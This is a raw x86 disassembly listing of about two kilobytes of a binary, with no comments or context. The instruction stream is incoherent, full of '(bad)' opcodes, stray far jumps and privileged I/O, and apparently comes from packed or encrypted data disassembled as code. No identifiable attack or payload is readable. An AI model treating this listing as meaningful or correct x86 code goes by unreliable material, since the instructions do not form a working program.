  4140d9:	sbb    edi,DWORD PTR [edx]
  4140db:	mov    bl,0x7
  4140dd:	jge    0x4140e3
  4140df:	aaa    
  4140e0:	sub    ah,BYTE PTR [ebx-0x42]
  4140e3:	pop    edi
  4140e4:	push   ds
  4140e5:	add    dl,bl
  4140e7:	cmp    eax,0xe0a03f7f
  4140ec:	cwde   
  4140ed:	mov    esp,DWORD PTR [ebx+eax*2+0xe19d2]
  4140f4:	mov    ch,0xff
  4140f6:	mov    DWORD PTR [edi+edx*4],ecx
  4140f9:	lods   eax,DWORD PTR ds:[esi]
  4140fa:	xchg   esi,eax
  4140fb:	jbe    0x414123
  4140fd:	xor    BYTE PTR [edi+0x39],bh
  414100:	mov    al,0x7c
  414102:	or     edi,ebx
  414104:	push   ds
  414105:	adc    dl,0xc0
  414108:	mov    WORD PTR [edi-0x31],ds
  41410b:	pop    DWORD PTR [edi]
  41410d:	(bad)  
  41410e:	fiadd  DWORD PTR [edx+0x2f]
  414111:	pop    eax
  414112:	aas    
  414113:	adc    esi,DWORD PTR [bx+si-0x37cc]
  414118:	ins    BYTE PTR es:[edi],dx
  414119:	adc    eax,0xef77e9c5
  41411e:	cmp    al,0xe2
  414120:	pusha  
  414121:	popf   
  414122:	fmul   QWORD PTR [esi+0x14]
  414125:	mov    ds:0xce1548e7,al
  41412a:	ficomp WORD PTR [ecx+0x6e]
  41412d:	jne    0x4140dc
  41412f:	cmp    ebx,DWORD PTR [ebp+0x777a30e9]
  414135:	or     esi,ecx
  414137:	call   0x1692:0xb41a3203
  41413e:	repz pop ebx
  414140:	cmp    BYTE PTR [edx+esi*4],cl
  414143:	mov    ebp,0x50e0e13f
  414148:	rol    BYTE PTR [edi+eax*4+0x69],0xaa
  41414d:	retf   0x5e51
  414150:	inc    eax
  414151:	pop    esp
  414152:	retf   
  414153:	push   0xffffffaa
  414155:	jl     0x4141a6
  414157:	aam    0x46
  414159:	jge    0x414126
  41415b:	out    0x19,al
  41415d:	add    al,0xf6
  41415f:	call   0xe3b2533b
  414164:	not    BYTE PTR [ebp+0x57]
  414167:	mov    esp,0x8c9661c2
  41416c:	int3   
  41416d:	mov    DWORD PTR [eax],0x4f4df5b1
  414173:	int3   
  414174:	rol    BYTE PTR [ecx-0x3b],0x29
  414178:	cdq    
  414179:	mov    ch,0xa4
  41417b:	xchg   edx,eax
  41417c:	scas   al,BYTE PTR es:[edi]
  41417d:	stos   BYTE PTR es:[edi],al
  41417e:	mov    DWORD PTR [ecx],ebx
  414180:	xchg   ebp,eax
  414181:	mov    cl,0x42
  414183:	std    
  414184:	sbb    al,0xaa
  414186:	imul   ebp,DWORD PTR [edi],0x2b036371
  41418c:	xor    DWORD PTR [esi+ecx*8-0x18],edx
  414190:	xchg   esi,eax
  414191:	and    esi,DWORD PTR [edi+0x17]
  414194:	or     DWORD PTR [ebp-0x32],edi
  414197:	jle    0x414150
  414199:	fstp   QWORD PTR [edi+0x6b]
  41419c:	outs   dx,DWORD PTR ds:[esi]
  41419d:	retf   
  41419e:	push   edi
  41419f:	add    eax,0xdb45724d
  4141a4:	es (bad) 
  4141a6:	xor    ecx,edi
  4141a8:	sub    al,0x40
  4141aa:	sbb    al,BYTE PTR [ecx]
  4141ac:	inc    ebx
  4141ad:	loope  0x4141d8
  4141af:	xor    edi,DWORD PTR [eax+0x6e]
  4141b2:	int    0x23
  4141b4:	adc    eax,0xcc789e57
  4141b9:	aaa    
  4141ba:	jne    0x41414f
  4141bc:	fidivr WORD PTR [edi]
  4141be:	(bad)  
  4141bf:	call   0xd066:0x65754e01
  4141c6:	mov    esp,DWORD PTR [esi-0x38]
  4141c9:	std    
  4141ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141cb:	jmp    0x60ee:0xc6c77892
  4141d2:	sbb    cl,BYTE PTR [ecx-0x69]
  4141d5:	fld    QWORD PTR [ecx]
  4141d7:	jmp    0x41424b
  4141d9:	and    BYTE PTR [eax],bh
  4141db:	loope  0x41424a
  4141dd:	xor    eax,0xfc75ca22
  4141e2:	sub    BYTE PTR [eax+0x45f94899],0x87
  4141e9:	mov    esi,0x4e9f0400
  4141ee:	imul   ebp,DWORD PTR [esi-0x2013e0d1],0xffffffea
  4141f5:	jmp    0x5df9:0xc2a4ad39
  4141fc:	or     DWORD PTR [ebx-0x1e15379a],edx
  414202:	out    0x76,eax
  414204:	call   0x68ad3da9
  414209:	in     al,0xe3
  41420b:	inc    ebx
  41420c:	outs   dx,BYTE PTR ds:[esi]
  41420d:	out    dx,al
  41420e:	int3   
  41420f:	shr    esp,1
  414211:	mul    DWORD PTR [edx+0x397bdd5]
  414217:	xchg   esi,edx
  414219:	jb     0x4141b7
  41421b:	fadd   QWORD PTR [ebx+0x1a]
  41421e:	jge    0x414220
  414220:	cmp    esp,0xffffffc1
  414223:	sub    eax,0x728c2e14
  414228:	fstp   st(1)
  41422a:	inc    eax
  41422b:	aad    0x2a
  41422d:	jmp    0x414252
  41422f:	ffree  st(7)
  414231:	sbb    DWORD PTR [ecx],0xf48bad16
  414237:	adc    BYTE PTR [eax+0x6a],ch
  41423a:	lods   al,BYTE PTR ds:[esi]
  41423b:	dec    ebx
  41423c:	pop    ds
  41423d:	imul   ebp,esp,0xffffffa0
  414240:	mov    dh,BYTE PTR [esi+0x1711f72a]
  414246:	pop    ss
  414247:	std    
  414248:	inc    edi
  414249:	ins    BYTE PTR es:[edi],dx
  41424a:	cmp    al,BYTE PTR [edi]
  41424c:	(bad)  
  41424d:	xchg   ecx,eax
  41424e:	xchg   al,bl
  414250:	mov    es,WORD PTR [eax-0x1a]
  414253:	jecxz  0x41422e
  414255:	mov    DWORD PTR [edi+0x6dd451b1],eax
  41425b:	add    eax,0x5aa8f7ba
  414260:	shr    bl,1
  414262:	(bad)  [ebx+0x52]
  414265:	xchg   esp,eax
  414266:	add    dh,ch
  414268:	pop    ecx
  414269:	mov    edx,0x5c5dc939
  41426e:	and    al,0xe0
  414270:	inc    edi
  414271:	retf   0x8e6a
  414274:	or     edi,DWORD PTR [edx-0x6d]
  414277:	fidiv  DWORD PTR [ecx]
  414279:	mov    DWORD PTR [ebp+eax*1-0x15],edi
  41427d:	stc    
  41427e:	mov    DWORD PTR [ecx+eiz*4+0x14],ecx
  414282:	pop    es
  414283:	xchg   DWORD PTR [esi-0x21],edi
  414286:	dec    edx
  414287:	mov    ah,0x26
  414289:	jmp    0x90afe4f8
  41428e:	xor    bh,dh
  414290:	push   ss
  414291:	sti    
  414292:	dec    edx
  414293:	or     DWORD PTR [edx],edi
  414295:	mov    cl,0xcc
  414297:	aam    0xe1
  414299:	inc    ebp
  41429a:	dec    ebp
  41429b:	cmp    ch,BYTE PTR [edx-0x54ec6441]
  4142a1:	pop    ds
  4142a2:	push   esi
  4142a3:	aad    0xe7
  4142a5:	add    DWORD PTR [edi],edi
  4142a7:	jle    0x4142f5
  4142a9:	or     eax,0x724aec6
  4142ae:	cdq    
  4142af:	into   
  4142b0:	loope  0x414314
  4142b2:	jmp    0xc07:0x62f908ab
  4142b9:	pusha  
  4142ba:	aaa    
  4142bb:	(bad)  
  4142bc:	sub    al,0xcc
  4142be:	dec    edi
  4142bf:	inc    ecx
  4142c0:	nop
  4142c1:	das    
  4142c2:	add    DWORD PTR [ebx-0x69],ebp
  4142c5:	cs daa 
  4142c7:	shr    BYTE PTR [edi+0x3d9ae9eb],0xd5
  4142ce:	imul   BYTE PTR [ebp-0x21cffde9]
  4142d4:	push   edx
  4142d5:	sub    edi,eax
  4142d7:	lahf   
  4142d8:	and    dl,BYTE PTR [edx]
  4142da:	or     BYTE PTR [esi],dh
  4142dc:	dec    ebp
  4142dd:	push   ss
  4142de:	call   0xc676:0x5d4b117e
  4142e5:	push   edi
  4142e6:	adc    BYTE PTR [edx],al
  4142e8:	repz cmp ebp,eax
  4142eb:	xchg   esp,eax
  4142ec:	mov    BYTE PTR [eax+0x5a],dl
  4142ef:	loope  0x41430b
  4142f1:	push   ds
  4142f2:	push   esp
  4142f3:	add    ebx,esi
  4142f5:	dec    eax
  4142f6:	icebp  
  4142f7:	mov    al,0x60
  4142f9:	or     DWORD PTR [edi+edx*8+0x3f],eax
  4142fd:	test   DWORD PTR [ebx],ebx
  4142ff:	xchg   edi,eax
  414300:	jb     0x4142cc
  414302:	scas   al,BYTE PTR es:[edi]
  414303:	fwait
  414304:	sbb    ecx,ebp
  414306:	mov    ?,WORD PTR [edx-0x4740a2c7]
  41430c:	in     al,dx
  41430d:	xchg   ebx,eax
  41430e:	fcmovne st,st(0)
  414310:	cdq    
  414311:	mov    al,0xde
  414313:	add    eax,0xda18ba17
  414318:	gs (bad) 
  41431b:	or     al,0x56
  41431d:	xor    ch,BYTE PTR [ecx]
  41431f:	push   0x71c72550
  414324:	test   eax,0xe15ac1e1
  414329:	dec    ebp
  41432a:	jp     0x4142e1
  41432c:	jae    0x414356
  41432e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41432f:	push   0x4
  414331:	pushf  
  414332:	aas    
  414333:	add    edx,DWORD PTR [ebp-0x59]
  414336:	dec    edx
  414337:	sbb    DWORD PTR [eax+0x76],ebx
  41433a:	ja     0x4142f5
  41433c:	(bad)  
  41433e:	in     al,0xf7
  414340:	jg     0x41433b
  414342:	lods   al,BYTE PTR ds:[esi]
  414343:	call   0xd7a8:0xc3ed6dfc
  41434a:	aad    0x39
  41434c:	fcomp  QWORD PTR [ebx+0x2724550c]
  414352:	or     DWORD PTR [eax-0x5d],0xffffffa9
  414356:	mov    ebp,0x5f9aa784
  41435b:	jp     0x414387
  41435d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41435e:	push   eax
  41435f:	mov    ch,0x78
  414361:	xchg   ebx,eax
  414362:	xchg   ecx,eax
  414363:	jne    0x41439a
  414365:	pop    ecx
  414366:	scas   eax,DWORD PTR es:[edi]
  414367:	cdq    
  414368:	shl    DWORD PTR [edi],cl
  41436a:	imul   esp,DWORD PTR [edx+0x4a88336c],0x35
  414371:	push   esi
  414372:	icebp  
  414373:	xchg   esi,edi
  414375:	pusha  
  414376:	je     0x4142fa
  414378:	mov    bl,0x30
  41437a:	push   edx
  41437b:	hlt    
  41437c:	jns    0x4143ed
  41437e:	cdq    
  41437f:	mov    al,0xc9
  414381:	into   
  414382:	test   DWORD PTR [ebx-0x75af9d1f],0x90b37c85
  41438c:	scas   eax,DWORD PTR es:[edi]
  41438d:	push   esi
  41438e:	xchg   esp,eax
  41438f:	repnz pop ebx
  414391:	inc    ebp
  414392:	mov    ebx,0x252b8fb8
  414397:	aas    
  414398:	add    BYTE PTR cs:[eax+0x29],ch
  41439c:	gs xor al,0xca
  41439f:	sub    eax,0xd4c9ee12
  4143a4:	push   ss
  4143a5:	gs jp  0x4143d8
  4143a8:	int    0x98
  4143aa:	dec    edi
  4143ab:	(bad)  
  4143ac:	das    
  4143ad:	in     eax,dx
  4143ae:	inc    ch
  4143b0:	lods   al,BYTE PTR ds:[esi]
  4143b1:	loope  0x4143db
  4143b3:	stc    
  4143b4:	fistp  QWORD PTR cs:[ebx]
  4143b7:	dec    esp
  4143b8:	dec    esi
  4143b9:	inc    ecx
  4143ba:	loope  0x414407
  4143bc:	and    edi,ebp
  4143be:	pop    edi
  4143bf:	lods   eax,DWORD PTR ds:[esi]
  4143c0:	lds    ecx,FWORD PTR [ecx+ebx*8]
  4143c3:	iret   
  4143c4:	fild   WORD PTR cs:[edx+0x51]
  4143c8:	mov    esp,0xc2da60f0
  4143cd:	jno    0x414446
  4143cf:	jo     0x414420
  4143d1:	adc    ch,BYTE PTR [ebx-0x33cd10ed]
  4143d7:	and    BYTE PTR [ebx+eax*4],0x96
  4143db:	popf   
  4143dc:	repz add eax,0xfb07f936
  4143e2:	jb     0x41441a
  4143e4:	and    eax,DWORD PTR [ebp-0x72d12a7c]
  4143ea:	rcl    BYTE PTR [edx+0x78],0x36
  4143ee:	bound  ebx,QWORD PTR [edi+eiz*8-0x142626d]
  4143f5:	xchg   ecx,eax
  4143f6:	xor    bl,bh
  4143f8:	int3   
  4143f9:	dec    edx
  4143fa:	inc    esp
  4143fb:	addr16 pop ebx
  4143fd:	dec    esp
  4143fe:	(bad)  
  4143ff:	xlat   BYTE PTR ds:[ebx]
  414400:	not    DWORD PTR [edx+ebp*2+0x51]
  414404:	cmp    bl,BYTE PTR [ebx-0x45]
  414407:	cwde   
  414408:	test   al,0xeb
  41440a:	popa   
  41440b:	and    al,0x40
  41440d:	ss fst st(1)
  414410:	xor    esi,DWORD PTR [eax]
  414412:	mov    esi,0x25013f2
  414417:	and    ah,BYTE PTR [ebp+0x57]
  41441a:	pop    esp
  41441b:	push   cs
  41441c:	icebp  
  41441d:	rcr    BYTE PTR [eax],1
  41441f:	daa    
  414420:	gs pop esi
  414422:	push   esi
  414423:	sbb    DWORD PTR [edi+0x1a862ca1],ebx
  414429:	mul    esi
  41442b:	and    ebx,DWORD PTR [ebx-0x5dd3115e]
  414431:	dec    bp
  414433:	call   0xa552c052
  414438:	fst    QWORD PTR ds:[ecx]
  41443b:	xchg   ecx,eax
  41443c:	inc    ecx
  41443d:	adc    BYTE PTR [ebx+0x7c],dl
  414440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414441:	dec    edi
  414442:	mov    ?,WORD PTR [ebp+0x44]
  414445:	pop    ss
  414446:	loopne 0x414480
  414448:	fsub   QWORD PTR [eax]
  41444a:	das    
  41444b:	cli    
  41444c:	push   ebp
  41444d:	xchg   ebx,eax
  41444e:	aas    
  41444f:	pop    ebp
  414450:	inc    esi
  414451:	push   ss
  414452:	xor    BYTE PTR [esi-0x4b0b716a],bl
  414458:	dec    eax
  414459:	lahf   
  41445a:	pop    es
  41445b:	ja     0x41448d
  41445d:	fwait
  41445e:	xchg   edx,eax
  41445f:	inc    esp
  414460:	leave  
  414461:	add    BYTE PTR [ebp+ecx*2-0x51829385],dh
  414468:	mov    bl,0x75
  41446a:	rcl    BYTE PTR [edi-0x62],0x2c
  41446e:	mov    dh,0x72
  414470:	pop    edx
  414471:	jbe    0x414429
  414473:	cwde   
  414474:	mov    eax,0xd9c92e81
  414479:	loopne 0x4144db
  41447b:	in     ax,dx
  41447d:	cmp    bh,ch
  41447f:	enter  0xbf9a,0xe0
  414483:	or     BYTE PTR [ecx-0x499d9321],bl
  414489:	sbb    edx,DWORD PTR [ecx+ebx*4]
  41448c:	jmp    0x49a7:0x1590a32c
  414493:	test   BYTE PTR [eax-0x6e],ah
  414496:	jno    0x4144ac
  414498:	pop    ss
  414499:	int    0x63
  41449b:	pop    edi
  41449c:	popa   
  41449d:	retf   
  41449e:	lds    edi,FWORD PTR [edi+ebp*8]
  4144a1:	in     al,dx
  4144a2:	sti    
  4144a3:	push   ebp
  4144a4:	rcr    DWORD PTR [ebx+0x685cf013],cl
  4144aa:	xor    DWORD PTR [eax+eiz*1+0x53],ebp
  4144ae:	dec    edi
  4144af:	(bad)  
  4144b0:	dec    esi
  4144b1:	cmp    edx,ebx
  4144b3:	popa   
  4144b4:	pusha  
  4144b5:	test   DWORD PTR [ecx-0x5d],0x97be6fef
  4144bc:	dec    edx
  4144bd:	xchg   ecx,eax
  4144be:	jnp    0x4144ff
  4144c0:	or     BYTE PTR [ebp-0x31],dh
  4144c3:	push   DWORD PTR [eax]
  4144c5:	or     bh,BYTE PTR [edx-0x76]
  4144c8:	daa    
  4144c9:	push   eax
  4144ca:	mov    ebx,0x98158fdc
  4144cf:	fiadd  DWORD PTR [eax+0xbf23538]
  4144d5:	out    dx,eax
  4144d6:	adc    DWORD PTR [eax],esi
  4144d8:	and    al,0x45
  4144da:	mov    bl,0xb5
  4144dc:	inc    ebx
  4144dd:	call   0x3c170f55
  4144e2:	daa    
  4144e3:	pop    ebx
  4144e4:	aaa    
  4144e5:	fwait
  4144e6:	mov    al,BYTE PTR cs:[ebp-0x73ba0c1c]
  4144ed:	fsubp  st(0),st
  4144ef:	add    edi,DWORD PTR [ecx]
  4144f1:	mov    eax,ds:0x2fa08f67
  4144f6:	mov    ds:0xb774ff6d,al
  4144fb:	jp     0x4144f8
  4144fd:	mov    ah,0x70
  4144ff:	mov    eax,ds:0x8d286bed
  414504:	jle    0x414521
  414506:	jne    0x414494
  414508:	xor    esp,DWORD PTR [edx]
  41450a:	inc    edx
  41450b:	jmp    0x1aaa636d
  414510:	call   0xc140:0xe857c665
  414517:	out    0x16,eax
  414519:	cmp    al,al
  41451b:	popf   
  41451c:	add    dl,BYTE PTR [edx+0x1d]
  41451f:	ins    DWORD PTR es:[edi],dx
  414520:	ss jbe 0x4144fe
  414523:	lods   eax,DWORD PTR ds:[esi]
  414524:	and    edx,eax
  414526:	mov    al,ds:0x50a44554
  41452b:	jl     0x414591
  41452d:	test   BYTE PTR [edi+0x68],ch
  414530:	sub    al,0x70
  414532:	dec    eax
  414533:	mov    bh,BYTE PTR ss:[eax]
  414536:	add    DWORD PTR [esi-0x20],edx
  414539:	js     0x41453c
  41453b:	inc    ecx
  41453c:	and    BYTE PTR [ecx+0x76],0xfd
  414540:	aam    0xb1
  414542:	push   edx
  414543:	mov    eax,0x96c0a7ab
  414548:	xchg   BYTE PTR [edx-0x7342b74e],bl
  41454e:	(bad)  
  41454f:	ja     0x414564
  414551:	loop   0x4145cf
  414553:	sbb    eax,0x5af644a8
  414558:	and    ah,BYTE PTR [esi]
  41455a:	jmp    0x41458a
  41455c:	and    BYTE PTR [edx+0x19],0x97
  414560:	xchg   DWORD PTR [esi-0x66b51459],edx
  414566:	jp     0x414588
  414568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414569:	mov    eax,0x7de19be7
  41456e:	test   al,0xcb
  414570:	and    eax,0xd56af7b3
  414575:	lock add bh,ch
  414578:	pop    esp
  414579:	adc    ah,BYTE PTR [edx+0xb88d98a]
  41457f:	scas   eax,DWORD PTR es:[edi]
  414580:	push   0xffffffa9
  414582:	xchg   edx,eax
  414583:	test   eax,0x46cff3d0
  414588:	mov    ch,0xd
  41458a:	adc    DWORD PTR [ebx-0x53ce7e2f],ebp
  414590:	dec    esi
  414591:	adc    ecx,DWORD PTR [eax+0x25]
  414594:	inc    esi
  414595:	push   ecx
  414596:	mov    edi,0x4a5c6feb
  41459b:	dec    esi
  41459c:	retf   
  41459d:	fs push cs
  41459f:	xchg   ebp,eax
  4145a0:	test   DWORD PTR [edi],ebx
  4145a2:	icebp  
  4145a3:	or     al,0x27
  4145a5:	aad    0xea
  4145a7:	fimul  DWORD PTR [esi+edx*4-0x43]
  4145ab:	xlat   BYTE PTR ds:[ebx]
  4145ac:	and    bh,BYTE PTR [edi+edi*4]
  4145af:	in     eax,0xba
  4145b1:	xchg   BYTE PTR [ecx+ebx*4],bh
  4145b4:	sub    BYTE PTR [edx+0x7f],0x1f
  4145b8:	je     0x414548
  4145ba:	sbb    bh,dl
  4145bc:	mov    es:0xc0f69890,al
  4145c2:	repnz sub DWORD PTR [ebx],0x5c357da5
  4145c9:	int    0x30
  4145cb:	test   dh,0x36
  4145ce:	fisub  DWORD PTR [edi+0x1f40d5e3]
  4145d4:	mul    BYTE PTR [esi-0x66bb4aa7]
  4145da:	loopne 0x414618
  4145dc:	out    0xd0,eax
  4145de:	jb     0x4145bf
  4145e0:	pop    esi
  4145e1:	test   BYTE PTR [edx-0x5f620ea5],0xba
  4145e8:	int    0x32
  4145ea:	cmp    eax,0xecd4191a
  4145ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145f0:	pop    ds
  4145f1:	fwait
  4145f2:	iret   
  4145f3:	jge    0x41465d
  4145f5:	icebp  
  4145f6:	cld    
  4145f7:	jmp    0x74e8a1d7
  4145fc:	fs jg  0x414646
  4145ff:	ds mov edi,0xf5271fe2
  414605:	jbe    0x414629
  414607:	int3   
  414608:	inc    edx
  414609:	mov    BYTE PTR [ecx+esi*2],al
  41460c:	es mov bl,0xc5
  41460f:	bound  ebx,QWORD PTR [esi-0x28]
  414612:	icebp  
  414613:	mov    cl,0x4e
  414615:	retf   
  414616:	daa    
  414617:	and    DWORD PTR [eax+0x7432f0d6],edx
  41461d:	cmp    DWORD PTR [ebx],ebp
  41461f:	bound  esi,QWORD PTR [ecx+eax*4-0x3533d37]
  414626:	xchg   esp,eax
  414627:	adc    DWORD PTR [esi-0x6e],edi
  41462a:	pop    ss
  41462b:	stc    
  41462c:	or     ebp,DWORD PTR [ecx-0x4a]
  41462f:	outs   dx,DWORD PTR ds:[esi]
  414630:	pop    ds
  414631:	rcl    DWORD PTR [esi+0x65595a16],0xd2
  414638:	dec    esp
  414639:	iret   
  41463a:	and    ebp,DWORD PTR [esi+edi*1+0x5]
  41463e:	lea    ebp,[eax+0x2050d038]
  414644:	repz rep outs dx,DWORD PTR ds:[esi]
  414647:	sbb    eax,DWORD PTR [edx-0x5921c902]
  41464d:	xchg   esi,eax
  41464e:	mov    ds:0xa71d0387,eax
  414653:	mov    ch,bh
  414655:	cmp    eax,0xc899eb41
  41465a:	mov    esp,0xd52d1f5c
  41465f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414660:	mov    ch,BYTE PTR [edi-0x44]
  414663:	shl    al,1
  414665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414666:	pushf  
  414667:	fs addr16 (bad) 
  41466a:	lods   al,BYTE PTR ds:[esi]
  41466b:	mov    ds:0x597f499c,al
  414670:	ret    0x31d4
  414673:	(bad)  
  414674:	mov    cl,0x3f
  414676:	js     0x4146aa
  414678:	shl    DWORD PTR [ecx],0x15
  41467b:	pop    es
  41467c:	scas   eax,DWORD PTR es:[edi]
  41467d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41467e:	add    al,0x82
  414680:	lock xor DWORD PTR [esi-0x3fb118f0],esp
  414687:	int    0xad
  414689:	imul   ebx,DWORD PTR [ebp-0x6e],0xd834511d
  414690:	bound  ecx,QWORD PTR [ecx-0x71]
  414693:	cmp    cl,BYTE PTR [ebx+0x323bd5aa]
  414699:	in     al,0xee
  41469b:	jecxz  0x4146b1
  41469d:	pop    ebp
  41469e:	jns    0x41467f
  4146a0:	add    esi,ecx
  4146a2:	add    dl,bh
  4146a4:	xchg   ebp,eax
  4146a5:	mov    ebx,0x2e636534
  4146aa:	mov    eax,0x301850b1
  4146af:	sub    al,0xe1
  4146b1:	jl     0x414726
  4146b3:	cmp    DWORD PTR [edi],esi
  4146b5:	mov    bh,0x60
  4146b7:	inc    ebx
  4146b8:	mov    ecx,0x1b39226a
  4146bd:	cli    
  4146be:	les    ecx,FWORD PTR [edi]
  4146c0:	imul   edi,DWORD PTR [ebx],0xffffffb2
  4146c3:	inc    ecx
  4146c4:	dec    edi
  4146c5:	jo     0x41469b
  4146c7:	dec    ebp
  4146c8:	mov    DWORD PTR ds:0x26ac0e45,ebx
  4146ce:	mov    cl,0x11
  4146d0:	sbb    edx,DWORD PTR [ebp-0x9]
  4146d3:	mov    ds:0x85b801b2,al
  4146d8:	cmp    BYTE PTR [edx+0x78],ah
  4146db:	seto   BYTE PTR ds:0x800279f3
  4146e2:	test   BYTE PTR [ecx-0x269848d8],0x10
  4146e9:	adc    eax,0x3a0772e8
  4146ee:	mov    ds:0x5f1205f4,al
  4146f3:	cmp    DWORD PTR [ebp+0x66],ebx
  4146f6:	push   cs
  4146f7:	jle    0x414700
  4146f9:	cdq    
  4146fa:	cmp    al,0xee
  4146fc:	lahf   
  4146fd:	add    DWORD PTR [edi+0x7c],edi
  414700:	(bad)  
  414702:	icebp  
  414703:	sbb    cl,BYTE PTR [eax+0x34]
  414706:	ret    
  414707:	cmp    esi,ebp
  414709:	mov    DWORD PTR [ebp-0x4a41dfa1],eax
  41470f:	hlt    
  414710:	sub    al,0x41
  414712:	adc    dl,al
  414714:	fbld   TBYTE PTR [ecx-0x59]
  414717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414718:	popf   
  414719:	jle    0x41476a
  41471b:	mov    eax,ds:0x47b97c84
  414720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414721:	fild   WORD PTR [ebp-0x129c0b00]
  414727:	dec    ebp
  414728:	mov    edi,DWORD PTR [edi+eiz*8-0x218714d5]
  41472f:	std    
  414730:	popa   
  414731:	in     eax,0xbf
  414733:	les    ebx,FWORD PTR [esi-0x7aeb7eab]
  414739:	ret    0xec3c
  41473c:	xor    al,BYTE PTR [ebp-0x5f3f08a]
  414742:	xchg   BYTE PTR [ecx],cl
  414744:	fist   WORD PTR [eax-0x6f54f04d]
  41474a:	push   es
  41474b:	fldenv [ebx+0x6e5ffd5f]
  414751:	(bad)  
  414752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414753:	stc    
  414754:	rcl    DWORD PTR [ebp-0x4f],1
  414757:	(bad)  
  414758:	std    
  414759:	popf   
  41475a:	out    0xe4,eax
  41475c:	jne    0x41471e
  41475e:	fld    DWORD PTR [esi-0x3ee5ef57]
  414764:	stos   BYTE PTR es:[edi],al
  414765:	dec    edi
  414766:	xor    DWORD PTR [ebx],edx
  414768:	push   esp
  414769:	retf   0xb4ba
  41476c:	jecxz  0x4147cc
  41476e:	adc    BYTE PTR [edi+ecx*2+0x3d],0xf3
  414773:	cli    
  414774:	in     al,0x34
  414776:	clc    
  414777:	xchg   ebp,eax
  414778:	data16 lods al,BYTE PTR ds:[esi]
  41477a:	sub    dl,bh
  41477c:	pop    esi
  41477d:	in     eax,dx
  41477e:	sub    BYTE PTR [esi+0x69],ch
  414781:	push   ebp
  414782:	adc    al,0xd9
  414784:	dec    ebx
  414785:	in     eax,0xa8
  414787:	test   eax,0xa77680a4
  41478c:	push   ss
  41478d:	jne    0x4147de
  41478f:	fld    QWORD PTR es:[ecx]
  414792:	loope  0x41472e
  414794:	(bad)  
  414796:	test   eax,0xfbec9286
  41479c:	mov    ds:0xccfaee01,al
  4147a1:	jl     0x4147e3
  4147a3:	aas    
  4147a4:	mov    al,0x27
  4147a6:	enter  0x2cd5,0x52
  4147aa:	and    eax,0x9fce2314
  4147af:	in     al,0x12
  4147b1:	mov    edx,0xb4ddd201
  4147b6:	int    0x6c
  4147b8:	push   ecx
  4147b9:	mov    BYTE PTR [eax],0xf2
  4147bc:	add    cl,BYTE PTR [esi-0x666dbf08]
  4147c2:	mov    esi,DWORD PTR [edi-0x1c411ea0]
  4147c8:	and    BYTE PTR [esi],ah
  4147ca:	test   DWORD PTR [esp+ecx*1],eax
  4147cd:	popa   
  4147ce:	(bad)  
  4147cf:	fstp   DWORD PTR [esp+ecx*4-0x57]
  4147d3:	int    0xc7
  4147d5:	inc    ecx
  4147d6:	mov    ds:0x77ff7cb8,al
  4147db:	retf   0xf8fa
  4147de:	jno    0x414761
  4147e0:	stos   DWORD PTR es:[edi],eax
  4147e1:	jmp    0x65c8:0x6eebe82f
  4147e8:	ret    0x124
  4147eb:	rcl    DWORD PTR [edi+0x37],0x49
  4147ef:	nop
  4147f0:	pop    ss
  4147f1:	imul   esp,DWORD PTR [edx-0x3d],0x83780dff
  4147f8:	call   FWORD PTR es:[esi-0x10]
  4147fc:	stc    
  4147fd:	or     edi,DWORD PTR [ebx]
  4147ff:	push   edx
  414800:	rcr    BYTE PTR [ebx-0x7e],0x46
  414804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414805:	xchg   ebp,eax
  414806:	rcr    BYTE PTR [eax],cl
  414808:	jp     0x4147c0
  41480a:	xchg   edx,eax
  41480b:	pop    ebx
  41480c:	push   0x7bc4ca1
  414811:	aad    0x74
  414813:	mov    cs,WORD PTR [edi-0x11]
  414816:	into   
  414817:	pop    ds
  414818:	adc    DWORD PTR [eax],esp
  41481a:	jno    0x414865
  41481c:	dec    esp
  41481d:	jmp    0x73306ec7
  414822:	in     eax,0xdb
  414824:	ins    BYTE PTR es:[edi],dx
  414825:	shl    BYTE PTR [bx+si-0x27],1
  414829:	mov    cl,0xc3
  41482b:	loopne 0x41489a
  41482d:	fist   WORD PTR [eax+eax*8+0x7]
  414831:	inc    edx
  414832:	fcom   DWORD PTR [esp+eax*1+0x77156509]
  414839:	mov    bh,BYTE PTR [ebx+0xc]
  41483c:	xchg   BYTE PTR [eax+ebx*8-0xc],dl
  414840:	test   BYTE PTR [ebp+0x4e],bh
  414843:	mov    eax,0x643a8b9b
  414848:	aad    0xde
  41484a:	sub    dh,BYTE PTR [ecx-0x5912e6cb]
  414850:	(bad)  
  414851:	pusha  
  414852:	mov    ds:0xb48944ec,eax
  414857:	mov    ebx,0x86fed7d4
  41485c:	push   edx
  41485d:	pop    ebp
  41485e:	les    edx,FWORD PTR [ecx-0x3e]
  414861:	inc    esp
  414862:	lods   eax,DWORD PTR ds:[esi]
  414863:	pop    es
  414864:	pop    es
  414865:	dec    ebp
  414866:	rcr    BYTE PTR [ebp-0x634b3f1e],1
  41486c:	jl     0x4147f3
  41486e:	mov    dh,BYTE PTR [ebx]
  414870:	push   ds
  414871:	push   eax
  414872:	jp     0x41485e
  414874:	ror    DWORD PTR [esp+edx*2],0x13
  414878:	pop    ecx
  414879:	rol    esi,1
  41487b:	jge    0x414822
  41487d:	sbb    BYTE PTR [ebx-0x5c],cl
  414880:	add    al,0x99
  414882:	pushf  
  414883:	ds int 0xc
  414886:	push   eax
  414887:	pop    eax
  414888:	pushf  
  414889:	int3   
  41488a:	popf   
  41488b:	fisubr WORD PTR [esi-0x762679fc]
  414891:	leave  
  414892:	mov    edi,DWORD PTR [edx+ebx*4+0x7b]
  414896:	pop    ds
  414897:	cmp    eax,0xef87a2ad
  41489c:	rol    DWORD PTR [edi],1
  41489e:	mov    ebp,0xd789210c
  4148a3:	lds    edi,FWORD PTR [ebx-0x4]
